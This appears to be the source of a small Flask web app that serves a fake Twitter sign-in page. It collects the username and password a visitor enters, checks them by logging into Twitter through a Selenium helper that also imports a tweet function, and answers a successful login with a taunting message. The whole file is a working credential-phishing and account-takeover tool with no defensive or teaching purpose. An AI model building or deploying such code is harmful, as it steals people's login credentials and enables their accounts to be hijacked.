from flask import Flask, request
from flask import render_template
from selenium_twitter import loginTwitter, tweet

app = Flask(__name__)

@app.route('/')
def index():
	return render_template('index.html', name=None)

@app.route('/sign_in.html', methods=['GET', 'POST'])
def load():
	#url_for('static', filename='logo.png')
	if request.method == 'POST':
		username = request.form['session[username_or_email]']
		password = request.form['session[password]']
		if loginTwitter(username, password) == True:
			return 'you got fucked'
		else:
			return 'wrong password'

	else:
		return render_template('sign_in.html', name=None)

if __name__ == '__main__':
	app.run()